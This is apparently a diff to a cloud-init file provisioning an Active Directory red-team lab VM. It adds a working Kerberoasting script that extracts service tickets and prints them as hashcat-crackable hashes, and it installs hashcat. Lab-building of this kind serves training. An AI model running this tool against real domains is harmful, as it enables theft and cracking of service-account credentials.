@@ -8,6 +8,60 @@ ssh_authorized_keys:
   - __ANSIBLE_PUBKEY__
 
 write_files:
+  - path: /usr/local/bin/lab-kerberoast
+    permissions: '0o755'   # explicit octal: Multipass turns '0755' into the integer 493, which fails cloud-init's schema
+    content: |
+      #!/opt/redteam-venv/bin/python3
+      """Kerberoast one SPN and print the ticket as a hashcat/john hash.
+
+      Samba 4.19's KDC rejects impacket's TGS-REQ ("No authenticator in request":
+      impacket sends no authenticator checksum), so GetUserSPNs -request and nxc
+      --kerberoasting fail against this lab. MIT's kinit/kvno build a valid
+      request; this script uses them and reads the ticket back with impacket.
+
+      Usage: lab-kerberoast <user> <password> <spn> <spn-account>
+        e.g. lab-kerberoast alice.user 'Passw0rd!23' MSSQLSvc/fs01.lab.local:1433 svc_sql
+      """
+      import os
+      import subprocess
+      import sys
+      import tempfile
+      from binascii import hexlify
+
+      from impacket.krb5.asn1 import Ticket
+      from impacket.krb5.ccache import CCache
+      from pyasn1.codec.der import decoder
+
+      if len(sys.argv) != 5:
+          sys.exit(__doc__)
+      user, password, spn, account = sys.argv[1:]
+      realm = os.environ.get("LAB_REALM", "__DOMAIN_REALM__")
+
+      with tempfile.TemporaryDirectory() as tmp:
+          env = dict(os.environ, KRB5CCNAME=f"FILE:{tmp}/cc")
+          for cmd, stdin in ((["kinit", f"{user}@{realm}"], password + "\n"), (["kvno", f"{spn}@{realm}"], None)):
+              r = subprocess.run(cmd, input=stdin, text=True, env=env, capture_output=True)
+              if r.returncode != 0:
+                  sys.exit(f"{' '.join(cmd)} failed: {r.stderr.strip()}")
+          ccache = CCache.loadFile(f"{tmp}/cc")
+
+      for cred in ccache.credentials:
+          server = cred["server"].prettyPrint().decode()
+          if not server.lower().startswith(spn.lower()):
+              continue
+          ticket = decoder.decode(cred.ticket["data"], asn1Spec=Ticket())[0]
+          etype = int(ticket["enc-part"]["etype"])
+          cipher = bytes(ticket["enc-part"]["cipher"])
+          spn_field = spn.replace(":", "~")
+          if etype == 23:   # RC4-HMAC: hashcat -m 13100
+              print(f"$krb5tgs$23$*{account}${realm}${spn_field}*${hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}")
+          elif etype in (17, 18):   # AES: hashcat -m 19600 / 19700
+              print(f"$krb5tgs${etype}${account}${realm}$*{spn_field}*${hexlify(cipher[-12:]).decode()}${hexlify(cipher[:-12]).decode()}")
+          else:
+              sys.exit(f"unsupported ticket encryption type {etype}")
+          break
+      else:
+          sys.exit(f"no service ticket for {spn} in the cache")
   - path: /root/provision.sh
     permissions: '0o755'   # explicit octal: Multipass turns '0755' into the integer 493, which fails cloud-init's schema
     content: |
@@ -35,8 +89,17 @@ write_files:
       resolvectl flush-caches 2>/dev/null || true
 
       apt-get update -y
-      apt-get install -y nmap hydra gobuster smbclient ldap-utils \
+      apt-get install -y nmap hydra gobuster smbclient ldap-utils hashcat \
           python3-pip python3-venv pipx git krb5-user
+
+      # Kerberos client config for the lab realm (the krb5-user package
+      # otherwise leaves its example default realm in place).
+      cat > /etc/krb5.conf <<EOF
+      [libdefaults]
+          default_realm = ${DOMAIN_REALM}
+          dns_lookup_realm = false
+          dns_lookup_kdc = true
+      EOF
 
       # Rust toolchain for netexec's aardwolf dependency (a Rust extension).
       # Ubuntu 24.04's default `cargo` (1.75) is too old to read aardwolf's
